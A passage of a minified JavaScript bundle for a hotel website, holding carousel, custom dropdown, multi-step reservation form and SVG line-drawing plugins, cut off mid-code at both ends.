0===e.MozPerspective&&(t.animType=!1)),void 0!==e.webkitTransform&&(t.animType="webkitTransform",t.transformType="-webkit-transform",t.transitionType="webkitTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(t.animType=!1)),void 0!==e.msTransform&&(t.animType="msTransform",t.transformType="-ms-transform",t.transitionType="msTransition",void 0===e.msTransform&&(t.animType=!1)),void 0!==e.transform&&!1!==t.animType&&(t.animType="transform",t.transformType="transform",t.transitionType="transition"),t.transformsEnabled=null!==t.animType&&!1!==t.animType},e.prototype.setSlideClasses=function(t){var e,i,n,o,r=this;i=r.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden","true"),r.$slides.eq(t).addClass("slick-current"),!0===r.options.centerMode?(e=Math.floor(r.options.slidesToShow/2),!0===r.options.infinite&&(t>=e&&t<=r.slideCount-1-e?r.$slides.slice(t-e,t+e+1).addClass("slick-active").attr("aria-hidden","false"):(n=r.options.slidesToShow+t,i.slice(n-e+1,n+e+2).addClass("slick-active").attr("aria-hidden","false")),0===t?i.eq(i.length-1-r.options.slidesToShow).addClass("slick-center"):t===r.slideCount-1&&i.eq(r.options.slidesToShow).addClass("slick-center")),r.$slides.eq(t).addClass("slick-center")):t>=0&&t<=r.slideCount-r.options.slidesToShow?r.$slides.slice(t,t+r.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"):i.length<=r.options.slidesToShow?i.addClass("slick-active").attr("aria-hidden","false"):(o=r.slideCount%r.options.slidesToShow,n=!0===r.options.infinite?r.options.slidesToShow+t:t,r.options.slidesToShow==r.options.slidesToScroll&&r.slideCount-t<r.options.slidesToShow?i.slice(n-(r.options.slidesToShow-o),n+o).addClass("slick-active").attr("aria-hidden","false"):i.slice(n,n+r.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false")),"ondemand"===r.options.lazyLoad&&r.lazyLoad()},e.prototype.setupInfinite=function(){var e,i,n,o=this;if(!0===o.options.fade&&(o.options.centerMode=!1),!0===o.options.infinite&&!1===o.options.fade&&(i=null,o.slideCount>o.options.slidesToShow)){for(n=!0===o.options.centerMode?o.options.slidesToShow+1:o.options.slidesToShow,e=o.slideCount;e>o.slideCount-n;e-=1)i=e-1,t(o.$slides[i]).clone(!0).attr("id","").attr("data-slick-index",i-o.slideCount).prependTo(o.$slideTrack).addClass("slick-cloned");for(e=0;e<n;e+=1)i=e,t(o.$slides[i]).clone(!0).attr("id","").attr("data-slick-index",i+o.slideCount).appendTo(o.$slideTrack).addClass("slick-cloned");o.$slideTrack.find(".slick-cloned").find("[id]").each((function(){t(this).attr("id","")}))}},e.prototype.setPaused=function(t){var e=this;!0===e.options.autoplay&&!0===e.options.pauseOnHover&&(e.paused=t,t?e.autoPlayClear():e.autoPlay())},e.prototype.selectHandler=function(e){var i=this,n=t(e.target).is(".slick-slide")?t(e.target):t(e.target).parents(".slick-slide"),o=parseInt(n.attr("data-slick-index"));if(o||(o=0),i.slideCount<=i.options.slidesToShow)return i.setSlideClasses(o),void i.asNavFor(o);i.slideHandler(o)},e.prototype.slideHandler=function(t,e,i){var n,o,r,s,a,l=this;if(e=e||!1,(!0!==l.animating||!0!==l.options.waitForAnimate)&&!(!0===l.options.fade&&l.currentSlide===t||l.slideCount<=l.options.slidesToShow))if(!1===e&&l.asNavFor(t),n=t,a=l.getLeft(n),s=l.getLeft(l.currentSlide),l.currentLeft=null===l.swipeLeft?s:l.swipeLeft,!1===l.options.infinite&&!1===l.options.centerMode&&(t<0||t>l.getDotCount()*l.options.slidesToScroll))!1===l.options.fade&&(n=l.currentSlide,!0!==i?l.animateSlide(s,(function(){l.postSlide(n)})):l.postSlide(n));else if(!1===l.options.infinite&&!0===l.options.centerMode&&(t<0||t>l.slideCount-l.options.slidesToScroll))!1===l.options.fade&&(n=l.currentSlide,!0!==i?l.animateSlide(s,(function(){l.postSlide(n)})):l.postSlide(n));else{if(!0===l.options.autoplay&&clearInterval(l.autoPlayTimer),o=n<0?l.slideCount%l.options.slidesToScroll!=0?l.slideCount-l.slideCount%l.options.slidesToScroll:l.slideCount+n:n>=l.slideCount?l.slideCount%l.options.slidesToScroll!=0?0:n-l.slideCount:n,l.animating=!0,l.$slider.trigger("beforeChange",[l,l.currentSlide,o]),r=l.currentSlide,l.currentSlide=o,l.setSlideClasses(l.currentSlide),l.updateDots(),l.updateArrows(),!0===l.options.fade)return!0!==i?(l.fadeSlideOut(r),l.fadeSlide(o,(function(){l.postSlide(o)}))):l.postSlide(o),void l.animateHeight();!0!==i?l.animateSlide(a,(function(){l.postSlide(o)})):l.postSlide(o)}},e.prototype.startLoad=function(){var t=this;!0===t.options.arrows&&t.slideCount>t.options.slidesToShow&&(t.$prevArrow.hide(),t.$nextArrow.hide()),!0===t.options.dots&&t.slideCount>t.options.slidesToShow&&t.$dots.hide(),t.$slider.addClass("slick-loading")},e.prototype.swipeDirection=function(){var t,e,i,n,o=this;return t=o.touchObject.startX-o.touchObject.curX,e=o.touchObject.startY-o.touchObject.curY,i=Math.atan2(e,t),(n=Math.round(180*i/Math.PI))<0&&(n=360-Math.abs(n)),n<=45&&n>=0||n<=360&&n>=315?!1===o.options.rtl?"left":"right":n>=135&&n<=225?!1===o.options.rtl?"right":"left":!0===o.options.verticalSwiping?n>=35&&n<=135?"left":"right":"vertical"},e.prototype.swipeEnd=function(t){var e,i=this;if(i.dragging=!1,i.shouldClick=!(i.touchObject.swipeLength>10),void 0===i.touchObject.curX)return!1;if(!0===i.touchObject.edgeHit&&i.$slider.trigger("edge",[i,i.swipeDirection()]),i.touchObject.swipeLength>=i.touchObject.minSwipe)switch(i.swipeDirection()){case"left":e=i.options.swipeToSlide?i.checkNavigable(i.currentSlide+i.getSlideCount()):i.currentSlide+i.getSlideCount(),i.slideHandler(e),i.currentDirection=0,i.touchObject={},i.$slider.trigger("swipe",[i,"left"]);break;case"right":e=i.options.swipeToSlide?i.checkNavigable(i.currentSlide-i.getSlideCount()):i.currentSlide-i.getSlideCount(),i.slideHandler(e),i.currentDirection=1,i.touchObject={},i.$slider.trigger("swipe",[i,"right"])}else i.touchObject.startX!==i.touchObject.curX&&(i.slideHandler(i.currentSlide),i.touchObject={})},e.prototype.swipeHandler=function(t){var e=this;if(!(!1===e.options.swipe||"ontouchend"in document&&!1===e.options.swipe||!1===e.options.draggable&&-1!==t.type.indexOf("mouse")))switch(e.touchObject.fingerCount=t.originalEvent&&void 0!==t.originalEvent.touches?t.originalEvent.touches.length:1,e.touchObject.minSwipe=e.listWidth/e.options.touchThreshold,!0===e.options.verticalSwiping&&(e.touchObject.minSwipe=e.listHeight/e.options.touchThreshold),t.data.action){case"start":e.swipeStart(t);break;case"move":e.swipeMove(t);break;case"end":e.swipeEnd(t)}},e.prototype.swipeMove=function(t){var e,i,n,o,r,s=this;return r=void 0!==t.originalEvent?t.originalEvent.touches:null,!(!s.dragging||r&&1!==r.length)&&(e=s.getLeft(s.currentSlide),s.touchObject.curX=void 0!==r?r[0].pageX:t.clientX,s.touchObject.curY=void 0!==r?r[0].pageY:t.clientY,s.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(s.touchObject.curX-s.touchObject.startX,2))),!0===s.options.verticalSwiping&&(s.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(s.touchObject.curY-s.touchObject.startY,2)))),"vertical"!==(i=s.swipeDirection())?(void 0!==t.originalEvent&&s.touchObject.swipeLength>4&&t.preventDefault(),o=(!1===s.options.rtl?1:-1)*(s.touchObject.curX>s.touchObject.startX?1:-1),!0===s.options.verticalSwiping&&(o=s.touchObject.curY>s.touchObject.startY?1:-1),n=s.touchObject.swipeLength,s.touchObject.edgeHit=!1,!1===s.options.infinite&&(0===s.currentSlide&&"right"===i||s.currentSlide>=s.getDotCount()&&"left"===i)&&(n=s.touchObject.swipeLength*s.options.edgeFriction,s.touchObject.edgeHit=!0),!1===s.options.vertical?s.swipeLeft=e+n*o:s.swipeLeft=e+n*(s.$list.height()/s.listWidth)*o,!0===s.options.verticalSwiping&&(s.swipeLeft=e+n*o),!0!==s.options.fade&&!1!==s.options.touchMove&&(!0===s.animating?(s.swipeLeft=null,!1):void s.setCSS(s.swipeLeft))):void 0)},e.prototype.swipeStart=function(t){var e,i=this;if(1!==i.touchObject.fingerCount||i.slideCount<=i.options.slidesToShow)return i.touchObject={},!1;void 0!==t.originalEvent&&void 0!==t.originalEvent.touches&&(e=t.originalEvent.touches[0]),i.touchObject.startX=i.touchObject.curX=void 0!==e?e.pageX:t.clientX,i.touchObject.startY=i.touchObject.curY=void 0!==e?e.pageY:t.clientY,i.dragging=!0},e.prototype.unfilterSlides=e.prototype.slickUnfilter=function(){var t=this;null!==t.$slidesCache&&(t.unload(),t.$slideTrack.children(this.options.slide).detach(),t.$slidesCache.appendTo(t.$slideTrack),t.reinit())},e.prototype.unload=function(){var e=this;t(".slick-cloned",e.$slider).remove(),e.$dots&&e.$dots.remove(),e.$prevArrow&&e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.remove(),e.$nextArrow&&e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.remove(),e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden","true").css("width","")},e.prototype.unslick=function(t){var e=this;e.$slider.trigger("unslick",[e,t]),e.destroy()},e.prototype.updateArrows=function(){var t=this;Math.floor(t.options.slidesToShow/2),!0===t.options.arrows&&t.slideCount>t.options.slidesToShow&&!t.options.infinite&&(t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false"),t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false"),0===t.currentSlide?(t.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true"),t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false")):(t.currentSlide>=t.slideCount-t.options.slidesToShow&&!1===t.options.centerMode||t.currentSlide>=t.slideCount-1&&!0===t.options.centerMode)&&(t.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")))},e.prototype.updateDots=function(){var t=this;null!==t.$dots&&(t.$dots.find("li").removeClass("slick-active").attr("aria-hidden","true"),t.$dots.find("li").eq(Math.floor(t.currentSlide/t.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden","false"))},e.prototype.visibility=function(){var t=this;document[t.hidden]?(t.paused=!0,t.autoPlayClear()):!0===t.options.autoplay&&(t.paused=!1,t.autoPlay())},e.prototype.initADA=function(){var e=this;e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({"aria-hidden":"true",tabindex:"-1"}).find("a, input, button, select").attr({tabindex:"-1"}),e.$slideTrack.attr("role","listbox"),e.$slides.not(e.$slideTrack.find(".slick-cloned")).each((function(i){t(this).attr({role:"option","aria-describedby":"slick-slide"+e.instanceUid+i})})),null!==e.$dots&&e.$dots.attr("role","tablist").find("li").each((function(i){t(this).attr({role:"presentation","aria-selected":"false","aria-controls":"navigation"+e.instanceUid+i,id:"slick-slide"+e.instanceUid+i})})).first().attr("aria-selected","true").end().find("button").attr("role","button").end().closest("div").attr("role","toolbar"),e.activateADA()},e.prototype.activateADA=function(){var t=this,e=t.$slider.find("*").is(":focus");t.$slideTrack.find(".slick-active").attr({"aria-hidden":"false",tabindex:"0"}).find("a, input, button, select").attr({tabindex:"0"}),e&&t.$slideTrack.find(".slick-active").focus()},e.prototype.focusHandler=function(){var e=this;e.$slider.on("focus.slick blur.slick","*",(function(i){i.stopImmediatePropagation();var n=t(this);setTimeout((function(){e.isPlay&&(n.is(":focus")?(e.autoPlayClear(),e.paused=!0):(e.paused=!1,e.autoPlay()))}),0)}))},t.fn.slick=function(){for(var t,i=this,n=arguments[0],o=Array.prototype.slice.call(arguments,1),r=i.length,s=0;s<r;s++)if("object"==typeof n||void 0===n?i[s].slick=new e(i[s],n):t=i[s].slick[n].apply(i[s].slick,o),void 0!==t)return t;return i}})),function(t){"use strict";t.fn.selectOrDie=function(e){var i,n,o={customID:null,customClass:"",placeholder:null,placeholderOption:!1,prefix:null,cycle:!1,stripEmpty:!1,links:!1,linksExternal:!1,size:0,tabIndex:0,onChange:t.noop},r={},s=!1,a={initSoD:function(e){return r=t.extend({},o,e),this.each((function(){if(t(this).parent().hasClass("sod_select"))console.log("Select or Die: It looks like the SoD already exists");else{var e,i,n,o=t(this),s=o.data("custom-id")?o.data("custom-id"):r.customID,l=o.data("custom-class")?o.data("custom-class"):r.customClass,d=o.data("prefix")?o.data("prefix"):r.prefix,c=o.data("placeholder")?o.data("placeholder"):r.placeholder,u=o.data("placeholder-option")?o.data("placeholder-option"):r.placeholderOption,h=o.data("cycle")?o.data("cycle"):r.cycle,p=o.data("links")?o.data("links"):r.links,f=o.data("links-external")?o.data("links-external"):r.linksExternal,g=parseInt(o.data("size"))?o.data("size"):r.size,m=parseInt(o.data("tabindex"))?o.data("tabindex"):r.tabIndex?r.tabIndex:o.attr("tabindex")?o.attr("tabindex"):r.tabIndex,v=o.data("strip-empty")?o.data("strip-empty"):r.stripEmpty,y=o.prop("title")?o.prop("title"):null,b=o.is(":disabled")?" disabled":"",x="",w="",k=0;d&&(x='<span class="sod_prefix">'+d+"</span> "),e=t("<span/>",{id:s,class:"sod_select "+l+b,title:y,tabindex:m,html:w+=c&&!d?'<span class="sod_label sod_placeholder">'+c+"</span>":'<span class="sod_label">'+x+"</span>","data-cycle":h,"data-links":p,"data-links-external":f,"data-placeholder":c,"data-placeholder-option":u,"data-prefix":d,"data-filter":""}).insertAfter(this),a.isTouch()&&e.addClass("touch"),i=t("<span/>",{class:"sod_list_wrapper"}).appendTo(e),n=t("<span/>",{class:"sod_list"}).appendTo(i),t("option, optgroup",o).each((function(i){var o=t(this);v&&!t.trim(o.text())?o.remove():0===i&&u&&!x?a.populateSoD(o,n,e,!0):a.populateSoD(o,n,e,!1)})),g&&(i.show(),t(".sod_option:lt("+g+")",n).each((function(){k+=t(this).outerHeight()})),i.removeAttr("style"),n.css({"max-height":k})),o.appendTo(e),e.on("focusin",a.focusSod).on("click",a.triggerSod).on("click",".sod_option",a.optionClick).on("mousemove",".sod_option",a.optionHover).on("keydown",a.keyboardUse),o.on("change",a.selectChange),t(document).on("click","label[for='"+o.attr("id")+"']",(function(t){t.preventDefault(),e.focus()}))}}))},populateSoD:function(e,i,n,o){var r=n.data("placeholder"),s=n.data("placeholder-option"),a=n.data("prefix"),l=n.find(".sod_label"),d=e.parent(),c=e.text(),u=e.val(),h=e.data("custom-id")?e.data("custom-id"):null,p=e.data("custom-class")?e.data("custom-class"):"",f=e.is(":disabled")?" disabled ":"",g=e.is(":selected")?" selected active ":"",m=e.data("link")?" link ":"",v=e.data("link-external")?" linkexternal":"",y=e.prop("label");e.is("option")?(t("<span/>",{class:"sod_option "+p+f+g+m+v,id:h,title:c,html:c,"data-value":u}).appendTo(i),o&&!a?(n.data("label",c),n.data("placeholder",c),e.prop("disabled",!0),i.find(".sod_option:last").addClass("is-placeholder disabled"),g&&l.addClass("sod_placeholder")):g&&r&&!s&&!a?n.data("label",r):g&&n.data("label",c),(g&&!r||g&&s||g&&a)&&l.append(c),d.is("optgroup")&&(i.find(".sod_option:last").addClass("groupchild"),d.is(":disabled")&&i.find(".sod_option:last").addClass("disabled"))):t("<span/>",{class:"sod_option optgroup "+f,title:y,html:y,"data-label":y}).appendTo(i)},focusSod:function(){var e=t(this);e.hasClass("disabled")?a.blurSod(e):(a.blurSod(t(".sod_select.focus").not(e)),e.addClass("focus"),t("html").on("click.sodBlur",(function(){a.blurSod(e)})))},triggerSod:function(e){e.stopPropagation();var i=t(this),o=i.find(".sod_list"),r=i.data("placeholder"),s=i.find(".active"),l=i.find(".selected");i.hasClass("disabled")||i.hasClass("open")||i.hasClass("touch")?(clearTimeout(n),i.removeClass("open"),r&&(i.find(".sod_label").get(0).lastChild.nodeValue=s.text())):(i.addClass("open"),r&&!i.data("prefix")&&i.find(".sod_label").addClass("sod_placeholder").html(r),a.listScroll(o,l),a.checkViewport(i,o))},keyboardUse:function(e){var n,o,r,l=t(this),d=l.find(".sod_list"),c=l.find(".sod_option"),u=l.find(".sod_label"),h=l.data("cycle"),p=c.filter(".active");return e.which>36&&e.which<41?(37===e.which||38===e.which?(o=p.prevAll(":not('.disabled, .optgroup')").first(),r=c.not(".disabled, .optgroup").last()):(39===e.which||40===e.which)&&(o=p.nextAll(":not('.disabled, .optgroup')").first(),r=c.not(".disabled, .optgroup").first()),!o.hasClass("sod_option")&&h&&(o=r),(o.hasClass("sod_option")||h)&&(p.removeClass("active"),o.addClass("active"),u.get(0).lastChild.nodeValue=o.text(),a.listScroll(d,o),l.hasClass("open")||(s=!0)),!1):(13===e.which||32===e.which&&l.hasClass("open")&&(" "===l.data("filter")[0]||""===l.data("filter"))?(e.preventDefault(),p.click()):32!==e.which||l.hasClass("open")||" "!==l.data("filter")[0]&&""!==l.data("filter")?27===e.which&&a.blurSod(l):(e.preventDefault(),s=!1,l.click()),void(0!==e.which&&(clearTimeout(i),l.data("filter",l.data("filter")+String.fromCharCode(e.which)),n=c.filter((function(){return 0===t(this).text().toLowerCase().indexOf(l.data("filter").toLowerCase())})).not(".disabled, .optgroup").first(),n.length&&(p.removeClass("active"),n.addClass("active"),a.listScroll(d,n),u.get(0).lastChild.nodeValue=n.text(),l.hasClass("open")||(s=!0)),i=setTimeout((function(){l.data("filter","")}),500))))},optionHover:function(){var e=t(this);e.hasClass("disabled")||e.hasClass("optgroup")||e.siblings().removeClass("active").end().addClass("active")},optionClick:function(e){e.stopPropagation();var i=t(this),o=i.closest(".sod_select"),r=i.hasClass("disabled"),s=i.hasClass("optgroup"),a=o.find(".sod_option:not('.optgroup')").index(this);o.hasClass("touch")||(r||s||(o.find(".selected, .sod_placeholder").removeClass("selected sod_placeholder"),i.addClass("selected"),o.find("select option")[a].selected=!0,o.find("select").change()),clearTimeout(n),o.removeClass("open"))},selectChange:function(){var e=t(this),i=e.find(":selected"),n=i.text(),o=e.closest(".sod_select");o.find(".sod_label").get(0).lastChild.nodeValue=n,o.data("label",n),r.onChange.call(this),!o.data("links")&&!i.data("link")||i.data("link-external")?(o.data("links-external")||i.data("link-external"))&&window.open(i.val(),"_blank"):window.location.href=i.val()},blurSod:function(e){if(t("body").find(e).length){var i=e.data("label"),o=e.data("placeholder"),r=e.find(".active"),a=e.find(".selected"),l=!1;clearTimeout(n),s&&!r.hasClass("selected")?(r.click(),l=!0):r.hasClass("selected")||(r.removeClass("active"),a.addClass("active")),!l&&o?e.find(".sod_label").get(0).lastChild.nodeValue=a.text():l||(e.find(".sod_label").get(0).lastChild.nodeValue=i),s=!1,e.removeClass("open focus"),e.blur(),t("html").off(".sodBlur")}},checkViewport:function(e,i){var o=e[0].getBoundingClientRect(),r=i.outerHeight();o.bottom+r+10>t(window).height()&&o.top-r>10?e.addClass("above"):e.removeClass("above"),n=setTimeout((function(){a.checkViewport(e,i)}),200)},listScroll:function(t,e){var i=t[0].getBoundingClientRect(),n=e[0].getBoundingClientRect();i.top>n.top?t.scrollTop(t.scrollTop()-i.top+n.top):i.bottom<n.bottom&&t.scrollTop(t.scrollTop()-i.bottom+n.bottom)},isTouch:function(){return"ontouchstart"in window||navigator.MaxTouchPoints>0||navigator.msMaxTouchPoints>0}},l={destroy:function(){return this.each((function(){var e=t(this),i=e.parent();i.hasClass("sod_select")?(e.off("change"),i.find("span").remove(),e.unwrap()):console.log("Select or Die: There's no SoD to destroy")}))},update:function(){return this.each((function(){var e=t(this),i=e.parent(),n=i.find(".sod_list:first");i.hasClass("sod_select")?(n.empty(),i.find(".sod_label").get(0).lastChild.nodeValue="",e.is(":disabled")&&i.addClass("disabled"),t("option, optgroup",e).each((function(){a.populateSoD(t(this),n,i)}))):console.log("Select or Die: There's no SoD to update")}))},disable:function(e){return this.each((function(){var i=t(this),n=i.parent();n.hasClass("sod_select")?void 0!==e?(n.find(".sod_list:first .sod_option[data-value='"+e+"']").addClass("disabled"),n.find(".sod_list:first .sod_option[data-label='"+e+"']").nextUntil(":not(.groupchild)").addClass("disabled"),t("option[value='"+e+"'], optgroup[label='"+e+"']",this).prop("disabled",!0)):n.hasClass("sod_select")&&(n.addClass("disabled"),i.prop("disabled",!0)):console.log("Select or Die: There's no SoD to disable")}))},enable:function(e){return this.each((function(){var i=t(this),n=i.parent();n.hasClass("sod_select")?void 0!==e?(n.find(".sod_list:first .sod_option[data-value='"+e+"']").removeClass("disabled"),n.find(".sod_list:first .sod_option[data-label='"+e+"']").nextUntil(":not(.groupchild)").removeClass("disabled"),t("option[value='"+e+"'], optgroup[label='"+e+"']",this).prop("disabled",!1)):n.hasClass("sod_select")&&(n.removeClass("disabled"),i.prop("disabled",!1)):console.log("Select or Die: There's no SoD to enable")}))}};return l[e]?l[e].apply(this,Array.prototype.slice.call(arguments,1)):"object"!=typeof e&&e?void t.error('Select or Die: Oh no! No such method "'+e+'" for the SoD instance'):a.initSoD.apply(this,arguments)}}(jQuery),function(t,e,i,n){"use strict";t.fn.serializeObject=function(){var e={},i=this.serializeArray();return t.each(i,(function(){void 0!==e[this.name]?(e[this.name].push||(e[this.name]=[e[this.name]]),e[this.name].push(this.value||"")):e[this.name]=this.value||""})),e};var o="reservationForm",r={propertyName:"value"};function s(e,i){this.element=e,this.settings=t.extend({},r,i),this._defaults=r,this._name=o,this.init()}t.extend(s.prototype,{_rreset:function(e){this.$form.find("input, select, textarea").each((function(e,i){"csrf_uvetok_name"!=t(i).attr("name")&&"csrf_uvecoo_name"!=t(i).attr("name")&&(i.value=i.defaultValue)})),this.currentStep=0,e&&this._toStep(0),this.$main.find('input[name="privacy"]').attr("checked",!1),this.$main.find(".current-step").text("01"),this.$main.find("select option:first-child").prop("selected",!0),this.$main.find("select option").trigger("change")},_toStep:function(t,e){if(8!=this.currentStep){this.currentStep=t;var i=this.$steps.filter(".active");e||i.addClass("old"),this.$steps.removeClass("active"),this.$steps.eq(t).addClass("active");var n=this;setTimeout((function(){n.$steps.eq(t).find("input").hasClass("datepicker")?n.$steps.eq(t).find(".datepicker-container span").trigger("click"):n.$steps.eq(t).find("input").focus(),i.removeClass("old")}),300),this.$bar.width((this.currentStep+1)/this.totalSteps*100+"%"),this.currentStep>0?this.$main.addClass("show-back"):this.$main.removeClass("show-back"),7==this.currentStep?this.$form.addClass("can-submit"):this.$form.hasClass("can-submit")&&this.$form.removeClass("can-submit"),this.$main.find(".current-step").text("0"+(this.currentStep+1))}},_nextStep:function(){if(7!=this.currentStep){var t=this.$steps.eq(this.currentStep).find("input");t.length&&""==t.val()||"email"==t.attr("type")&&!/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(t.val())||"adults"==t.attr("name")&&t.val()<=0?this.$steps.eq(this.currentStep).addClass("required"):(this.$steps.removeClass("required"),this.currentStep++,this._toStep(this.currentStep))}},init:function(){if(this.$main=t(this.element),this.$form=this.$main,this.$steps=this.$form.find(".step"),this.$inputs=this.$form.find("input"),this.$button=this.$main.find('button[type="button"]'),this.$submit=this.$main.find('button[type="submit"]'),this.$bar=this.$main.find(".steps-bar"),this.$btBack=this.$main.find(".bt-back"),!this.$main.data("plugin_reservationForm")){this._rreset();var i=this;this.$btBack.on("click",(function(){i.currentStep>0&&i._toStep(i.currentStep-1)})),this.$button.on("click",(function(){i._nextStep()})),this.$inputs.on("keydown",(function(t){t.keyCode||t.which,13===t.keyCode?(t.preventDefault(),i._nextStep()):9===t.keyCode&&t.preventDefault()})),this.$form.on("form:reset",(function(){e.currentRoom=!1,i._rreset(!0)})),this.$form.on("submit",(function(t){t.preventDefault()})),i.$main.find('input[name="privacy"]').on("change",(function(){i.$main.find('[name="privacy"]').is(":checked")?i.$main.find('[name="privacy"]').removeClass("required"):i.$main.find('[name="privacy"]').addClass("required")})),i.$submit.on("click",(function(n){if(n.preventDefault(),i.$main.find('[name="privacy"]').is(":checked")){var o=i.$form.serializeObject();e.currentRoom?dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:e.currentRoom,eventLabel:"form"}):dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:e.currentPage,eventLabel:"form"}),t("#reservation-recap-form .info1").text(o.name),t("#reservation-recap-form .info2").text(o.email),t("#reservation-recap-form .info3").text(o.from),t("#reservation-recap-form .info4").text(o.to),t("#reservation-recap-form .info5").text(o.adults),t("#reservation-recap-form .info6").text(o.childrens),t("#reservation-recap-form .info7").text(o.room),t("#reservation-recap-form .info8").text(o.info),t(this).prop("disabled",!1),$body.removeClass("showmenu").removeClass("showreservation"),$body.addClass("show-reservation-recap"),t(this).prop("disabled",!1),SETTINGS.svg&&(t(".send-loading").drawCircle(),t("#reservation-recap-form .recap-sent svg").drawSVG({speed:1,hideStrokeOnEnd:!1,showFillonEnd:!1,drawOnView:!0}));var r=!1;$document.on("click","#reservation-recap-form button",(function(n){n.preventDefault(),1!=r&&(r=!0,e.currentRoom?dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:e.currentRoom,eventLabel:"form-ok"}):dataLayer.push({event:"GAevent",eventCategory:"prenota",eventAction:e.currentPage,eventLabel:"form-ok"}),t(this).prop("disabled","disabled"),t("#reservation-recap-form").addClass("sending"),t.post(i.$form.attr("action"),i.$form.serialize(),(function(t){setTimeout((function(){location.href=t.redirect}),500)}),"json").fail((function(){console.log("errore")})),setTimeout((function(){SETTINGS.svg&&t("#reservation-recap-form .button-wrap .send-loading").trigger("circle:show"),setTimeout((function(){t("#reservation-recap-form").removeClass("sending").addClass("sent"),SETTINGS.svg&&t("#reservation-recap-form .recap-sent svg").trigger("draw:draw")}),3e3)}),200))}))}else i.$main.find('[name="privacy"]').addClass("required")}))}}}),t.fn[o]=function(e){return this.each((function(){t.data(this,"plugin_"+o)||t.data(this,"plugin_"+o,new s(this,e))}))}}(jQuery,window,document),function(t,e,i,n){"use strict";var o="drawSVG",r={speed:2,speedEnd:1,hideStrokeOnEnd:!0,showFillonEnd:!0,drawOnView:!1,callbackTimeout:3,notDraw:!1,callback:function(){}};function s(e,i){this.element=e,this.settings=t.extend({},r,i),this._defaults=r,this._name=o,this.transEndEventNames={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd",msTransition:"MSTransitionEnd",transition:"transitionend"},this.init()}t.extend(s.prototype,{init:function(){var e=this;if(e.$element=t(e.element),e.svg=e.$element[0],e.paths=e.$element.find("path"),!e.paths.length)return!1;e.$element.data("speed")&&(e.settings.speed=e.$element.data("speed")),e.transEndEventName=e.transEndEventNames[Modernizr.prefixed("transition")],e.$element.data("drawsvg")&&(e.settings=t.extend(e.settings,e.$element.data("drawsvg"))),e.$element.on("draw:build",(function(){for(var t=0;t<e.paths.length;t++){var i=e.paths[t],n=i.getTotalLength();i.style.fillOpacity=0,i.style.strokeOpacity=0,i.style.transition=i.style.WebkitTransition="none",i.style.strokeDasharray=n+" "+n,i.style.strokeDashoffset=n,i.getBoundingClientRect()}})),e.$element.trigger("draw:build"),e.$element.one("draw:draw",(function(){e.initAnimation()})),e.settings.drawOnView||e.settings.notDraw||e.$element.trigger("draw:draw")},initAnimation:function(){var t=this;t.settings.callback&&setTimeout((function(){t.settings.callback()}),1e3*t.settings.callbackTimeout);for(var e=0;e<t.paths.length;e++){var i=t.paths[e];i.getTotalLength(),i.style.strokeOpacity=1,i.style.transition=i.style.WebkitTransition="stroke-dashoffset "+t.settings.speed+"s ease-in-out",i.style.strokeDashoffset=0,t.fillPath(i)}},fillPath:function(e){var i=this;e.addEventListener(i.transEndEventName,(function(){e.style.transition=e.style.WebkitTransition="none",e.style.transition=e.style.WebkitTransition="fill-opacity "+i.settings.speedEnd+"s ease-in-out, stroke-opacity "+i.settings.speedEnd+"s ease-in-out",(i.settings.showFillonEnd||t(e).attr("fill")&&"none"!=t(e).attr("fill"))&&(e.style.fillOpacity=1),i.settings.hideStrokeOnEnd&&(e.style.strokeOpacity=0)}))}}),t.fn[o]=function(e){return this.each((function(){t.data(this,o+"Istance")||t.data(this,o+"Istance",new s(this,e))}))}}(jQuery,window,document),function(t,e,i,n){"use strict";var o="drawCircle",r={};function s(e,i){this.element=e,this.settings=t.extend({},r,i),this._defaults=r,this._name=o,this.init()}t.extend(s.prototype,{getSvg:function(t,e,i,n){return i||(i=t),n||(n=e),'<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 '+t+" "+e+'" width="'+i+'px" height="'+n+'px"></svg>'},init:function(){var e,i,n,o,r,s,a,l,d,c=this,u=t(this.element),h=u.find(".line"),p="#ffffff",f=!1,g=0,m=!1,v=u.data("stroke-width")?u.data("stroke-width"):1,y=u.data("hover-stroke-width")?u.data("hover-stroke-width"):v+1,b=u.data("speed")?u.data("speed"):600;if(u.data("stroke-color")&&(p=u.data("stroke-color")),u.data("hover-stroke-color")&&(m=u.data("hover-stroke-color")),u.data("hover-stroke-color")&&(m=u.data("hover-stroke-color")),u.data("drawcircle")){var 